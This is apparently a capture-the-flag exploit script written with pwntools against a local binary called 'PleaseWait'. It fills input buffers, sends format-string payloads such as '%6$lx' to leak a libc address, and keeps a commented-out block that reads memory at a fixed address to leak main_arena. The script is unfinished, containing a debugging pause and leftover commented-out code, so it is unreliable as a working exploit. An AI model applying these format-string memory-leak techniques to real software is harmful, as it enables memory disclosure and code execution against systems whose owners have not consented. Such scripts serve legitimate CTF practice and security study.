from pwn import*
p = process('./PleaseWait')

# definition
def flow(data):
	p.sendlineafter('s...\n>> ',data)


# exploit
sleep(1)
tmp = 96
for i in range(0,9):
	tmp += 1
	flow(chr(tmp)*0x8)
raw_input()
flow('X'*0x8)

# libc_leak
p.send('%6$lx')
p.send('X'*0x8)
p.send('X'*0x8)
p.send('X'*0x8)
p.send('X'*0x8)
p.send('X'*0x8)
'''
pay = ''
pay += 'aaaa%9$s'
pay += p64(0x6033a0)
p.send(pay)
p.recvline(10)
p.recv(5)
main_arena = u64(p.recv(6).ljust(8,'\x00'))
log.info("main_arean : {}".format(hex(main_arena)))
'''
p.interactive()
